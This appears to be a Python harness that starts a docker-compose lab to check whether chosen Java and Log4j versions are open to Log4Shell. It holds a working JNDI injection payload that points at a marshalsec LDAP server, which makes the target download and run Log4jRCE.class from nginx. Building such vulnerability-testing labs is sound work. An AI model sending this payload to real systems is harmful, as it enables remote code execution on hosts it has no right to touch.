import logging
import re
import os
import sys
from subprocess import Popen, PIPE
from jinja2 import Template

MARSHAL_SEC_UP_PATTERN = "^.*Listening on 0.0.0.0:1389.*$"

NETCAT_UP_PATTERN = "^.*.*$"
SPRING_BOOT_UP_PATTERN = "^.*Listening on 0.0.0.0:1389.*$"
PAYLOAD_SENT_PATTERN = ".*Sending payload.*"
HTTP_SERVER_UP_PATTERN = ".*1#1: nginx/.*"
MARSHAL_SEC_CALLED_PATTERN = ".*Send LDAP reference result for Log4jRCE redirecting to.*"
HTTP_CALLED_PATTERN = ".*GET /Log4jRCE.class HTTP/1.*"
NETCAT_CONNECTION_PATTERN = ""

PAYLOAD = "${jndi:ldap://marshalsec:1389/Log4jRCE}"
FORMAT = "%(asctime)s:%(levelname)8s -- %(message)s"
logging.basicConfig(format=FORMAT)
logging.root.setLevel(logging.NOTSET)
logger = logging.getLogger(__file__)


def main():
    if len(sys.argv) != 3:
        logger.error("USAGE: python cli.py java_version log4j_version")
        exit(-1)
    java_version = sys.argv[1]
    log4j_version = sys.argv[2]

    os.environ["JAVA_VERSION"] = java_version
    os.environ["LOG4J_VERSION"] = log4j_version
    os.environ["PAYLOD"] = PAYLOAD

    logger.info(f"Populating the docker-compose.yaml file for Java version: '{java_version}' and Log4J version: '{log4j_version}' with the payload '{PAYLOAD}'")
    
    
    logger.info("Starting up the docker environment.")
    docker_compose_up_process = Popen(["docker-compose", "up"], stdout=PIPE, stderr=PIPE, env=os.environ)
    while True:
        for line in iter(docker_compose_up_process.stdout.readline,''):
            decoded_line = line.rstrip().decode('utf-8')
            print(decoded_line)
            if re.match(MARSHAL_SEC_UP_PATTERN, decoded_line):
                logger.info("Marshalsec is up and running")
            
            if re.match(HTTP_SERVER_UP_PATTERN, decoded_line):
                logger.info("Nginx server is up and running")
            
            if re.match(HTTP_CALLED_PATTERN, decoded_line):
                logger.info("Exploit is being dowloaded from the Nginx server")

            if re.match(MARSHAL_SEC_CALLED_PATTERN, decoded_line):
                logger.info("The LDAP call was made by the JNDI payload")
            
            if re.match(PAYLOAD_SENT_PATTERN, decoded_line):
                logger.info("The payload was sent using curl")

            if "Remote Code Execution gained!!!" in decoded_line:
                logger.warning("This version of the application is vulnerable !!!!")
                docker_compose_down_process = Popen(["docker-compose", "down"], stdout=PIPE, stderr=PIPE)
                docker_compose_down_process.communicate()
                exit(1)
            if "has to be an integer." in decoded_line:
                print("This version of the application is not vulnerable")
                docker_compose_down_process = Popen(["docker-compose", "down"], stdout=PIPE, stderr=PIPE)
                docker_compose_down_process.communicate()
                exit(0)

if __name__ == "__main__":
    main()
